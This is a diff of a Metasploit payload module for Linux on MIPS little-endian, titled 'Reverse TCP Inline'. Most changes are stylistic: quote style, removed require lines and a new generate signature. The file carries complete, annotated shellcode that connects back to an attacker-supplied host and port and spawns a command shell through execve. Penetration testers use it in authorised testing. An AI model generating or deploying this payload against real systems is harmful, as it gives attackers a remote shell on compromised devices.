@@ -1,53 +1,47 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'msf/core/handler/reverse_tcp'
-require 'msf/base/sessions/command_shell'
-require 'msf/base/sessions/command_shell_options'
-
 module MetasploitModule
-
   CachedSize = 184
 
   include Msf::Payload::Single
-  include Msf::Payload::Linux
   include Msf::Sessions::CommandShellOptions
 
   def initialize(info = {})
-    super(merge_info(info,
-      'Name'          => 'Linux Command Shell, Reverse TCP Inline',
-      'Description'   => 'Connect back to attacker and spawn a command shell',
-      'Author'        =>
-        [
+    super(
+      merge_info(
+        info,
+        'Name' => 'Linux Command Shell, Reverse TCP Inline',
+        'Description' => 'Connect back to attacker and spawn a command shell',
+        'Author' => [
           'rigan <imrigan[at]gmail.com>', # Original (mipsbe) shellcode
           'juan vazquez' # Metasploit module
         ],
-      'License'       => MSF_LICENSE,
-      'Platform'      => 'linux',
-      'Arch'          => ARCH_MIPSLE,
-      'Handler'       => Msf::Handler::ReverseTcp,
-      'Session'       => Msf::Sessions::CommandShellUnix,
-      'Payload'       =>
-        {
-          'Offsets' => { },
+        'License' => MSF_LICENSE,
+        'Platform' => 'linux',
+        'Arch' => ARCH_MIPSLE,
+        'Handler' => Msf::Handler::ReverseTcp,
+        'Session' => Msf::Sessions::CommandShellUnix,
+        'Payload' => {
+          'Offsets' => {},
           'Payload' => ''
-        })
+        }
+      )
     )
   end
 
-  def generate
-    if( !datastore['LHOST'] or datastore['LHOST'].empty? )
+  def generate(_opts = {})
+    if !datastore['LHOST'] || datastore['LHOST'].empty?
       return super
     end
 
     host = Rex::Socket.addr_atoi(datastore['LHOST'])
     port = Integer(datastore['LPORT'])
 
-    host = [host].pack("N").unpack("cccc")
-    port = [port].pack("n").unpack("cc")
+    host = [host].pack('N').unpack('cccc')
+    port = [port].pack('n').unpack('cc')
 
     shellcode =
       # sys_socket
@@ -71,11 +65,11 @@ module MetasploitModule
       "\xfd\xff\x0f\x34" + # li t7,0xfffd
       "\x27\x78\xe0\x01" + # nor t7,t7,zero
       "\xe2\xff\xaf\xaf" + # sw t7,-30(sp)
-      port.pack("C2") + "\x0e\x3c" + # lui t6,0x1f90
-      port.pack("C2") + "\xce\x35" + # ori t6,t6,0x1f90
+      port.pack('C2') + "\x0e\x3c" + # lui t6,0x1f90
+      port.pack('C2') + "\xce\x35" + # ori t6,t6,0x1f90
       "\xe4\xff\xae\xaf" + # sw t6,-28(sp)
-      host[2..3].pack("C2") + "\x0e\x3c" + # lui t6,0x7f01
-      host[0..1].pack("C2") + "\xce\x35" +# ori t6,t6,0x101
+      host[2..3].pack('C2') + "\x0e\x3c" + # lui t6,0x7f01
+      host[0..1].pack('C2') + "\xce\x35" + # ori t6,t6,0x101
       "\xe6\xff\xae\xaf" + # sw t6,-26(sp)
       "\xe2\xff\xa5\x27" + # addiu a1,sp,-30
       "\xef\xff\x0c\x24" + # li t4,-17
@@ -113,9 +107,8 @@ module MetasploitModule
       "\xfc\xff\xa0\xaf" + # sw zero,-4(sp)
       "\xf8\xff\xa5\x27" + # addiu a1,sp,-8
       "\xab\x0f\x02\x24" + # li v0,4011 # sys_execve
-      "\x0c\x01\x01\x01"  # syscall 0x40404
+      "\x0c\x01\x01\x01" # syscall 0x40404
 
     return super + shellcode
   end
-
 end
